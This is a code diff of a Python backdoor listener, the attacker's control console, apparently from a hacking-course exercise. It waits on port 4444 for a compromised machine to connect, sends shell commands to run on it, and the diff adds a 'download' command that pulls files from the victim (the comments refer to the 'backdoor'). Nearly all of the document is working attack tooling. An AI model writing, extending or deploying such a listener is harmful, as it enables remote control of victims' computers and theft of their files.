@@ -1,20 +1,17 @@
-import socket, json
+import socket
+import json
 
 class Listener:
-    def __init__(self,ip, port ):
+    def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        #modify an option so we can reuse sockets
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        #bind socket to computer to listen for connections on port 4444
         listener.bind((ip, port))
         listener.listen(0)
         print("[+] Waiting for incoming connections")
-        # returns 2 values - socket object that represents the option that we can use to send or receive data
-        # 2nd object - address bound to the connection
-        self.connection, address =  listener.accept()
-        print("[+] Got a connection from" + str(address))
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from " + str(address))
 
-    def reliable_send(self,data):
+    def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data.encode('utf-8'))
 
@@ -33,14 +30,36 @@ class Listener:
         if command[0] == "exit":
             self.connection.close()
             exit()
-        # Receive and decode the result from bytes to string
         return self.reliable_receive()
+
+    def write_file(self, path, contents):
+        with open(path, "wb") as file:
+            file.write(contents)
+        return '[+] Download successful'
+
+    def receive_file(self, path):
+        with open(path, "wb") as file:
+            while True:
+                chunk = self.connection.recv(1024)
+                if chunk.endswith(b"DONE"):
+                    file.write(chunk[:-4])  # Write the chunk except 'DONE' marker
+                    break
+                file.write(chunk)
+        return '[+] Download successful'
 
     def run(self):
         while True:
             command = input(">> ").split(" ")
-            result = self.execute_remotely(command)
-            print(result)
+
+            # Handle download command separately
+            if command[0] == "download":
+                file_path = command[1]
+                self.reliable_send(command)  # Inform backdoor to send file
+                self.receive_file(file_path)  # Receive the file
+                print("[+] File downloaded successfully")
+            else:
+                result = self.execute_remotely(command)
+                print(result)
 
 my_listener = Listener("192.168.0.35", 4444)
 my_listener.run()
